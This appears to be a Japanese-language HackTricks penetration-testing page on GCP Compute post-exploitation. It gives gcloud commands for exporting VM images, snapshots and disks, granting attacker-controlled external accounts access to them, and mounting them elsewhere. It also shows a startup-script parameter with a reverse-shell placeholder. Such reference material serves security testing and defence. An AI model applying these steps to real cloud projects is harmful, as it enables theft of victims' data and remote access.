# GCP - Compute Post Exploitation

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**する
- **ハッキングトリックを共有するためにPRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出**する

</details>

## Compute

ComputeおよびVPC（ネットワーキング）の詳細については、以下をチェックしてください：

{% content-ref url="../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

### イメージのエクスポートとローカルでの検査

これにより、攻撃者は既存のイメージ内に含まれるデータにアクセスしたり、実行中のVMの新しいイメージを作成してそのデータにアクセスしたりできますが、実行中のVMにアクセス権がなくても可能です。

VMイメージをバケットにエクスポートしてから、次のコマンドでローカルにダウンロードしてマウントすることができます：

{% code overflow="wrap" %}
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
{% endcode %}

このアクションを実行するために、攻撃者はストレージバケットに対する特権と、確実に**cloudbuildに対する特権**が必要です。なぜなら、この**サービス**がエクスポートを実行するように求められるからです。\
さらに、これが機能するためには、codebuild SAとcompute SAに特権のある権限が必要です。\
cloudbuild SA `<project-id>@cloudbuild.gserviceaccount.com` には次の権限が必要です:

- roles/iam.serviceAccountTokenCreator
- roles/compute.admin
- roles/iam.serviceAccountUser

そしてSA `<project-id>-compute@developer.gserviceaccount.com` には次の権限が必要です:

- roles/compute.storageAdmin
- roles/storage.objectAdmin

### スナップショットとディスクのローカルエクスポートと検査

スナップショットとディスクを直接エクスポートすることはできませんが、**スナップショットをディスクに変換し、ディスクをイメージに変換**し、**前のセクション**に従って、そのイメージをローカルで検査することは可能です

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### イメージを検査してVMを作成する

攻撃者がイメージを作成した場所から**イメージに保存されているデータ**または**実行中のVM**内部にアクセスすることを目的として、イメージに外部アカウントへのアクセス権を付与することが可能です。
```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```
そして、それを元に新しいVMを作成します：
```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```
もしイメージに外部アカウントアクセス権限を与えられない場合は、被害者のプロジェクトでそのイメージを使用してVMを起動し、**メタデータを実行して逆シェルを作成**し、次のパラメータを追加してイメージにアクセスできます：
```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```
### スナップショット/ディスクの検査とVMへのアタッチ

**ディスクまたはスナップショットに保存されているデータにアクセスする目的で、スナップショットをディスクに変換し、ディスクをイメージに変換して前の手順に従うことができます。**

または、**外部アカウントにディスクへのアクセス権限を付与**することもできます（スナップショットが始点の場合は、スナップショットにアクセス権限を付与するか、それからディスクを作成します）。
```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```
**インスタンスにディスクをアタッチ**します：
```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```
VM内のディスクをマウントします：

1. **VMにSSH接続**します：

```sh
gcloud compute ssh [INSTANCE_NAME] --zone [ZONE]
```
2. **ディスクを特定**します：VM内に入ったら、ディスクデバイスをリストアップして新しいディスクを特定します。通常、`/dev/sdb`、`/dev/sdc`などとして見つけることができます。
3. **ディスクをフォーマットしてマウント**します（新しいまたは生ディスクの場合）：
*   マウントポイントを作成します：

```sh
sudo mkdir -p /mnt/disks/[MOUNT_DIR]
```
*   ディスクをマウントします：

```sh
sudo mount -o discard,defaults /dev/[DISK_DEVICE] /mnt/disks/[MOUNT_DIR]
```

スナップショットまたはディスクに外部プロジェクトへのアクセス権を与えることができない場合は、これらのアクションをスナップショット/ディスクと同じプロジェクト内のインスタンスで実行する必要があります。
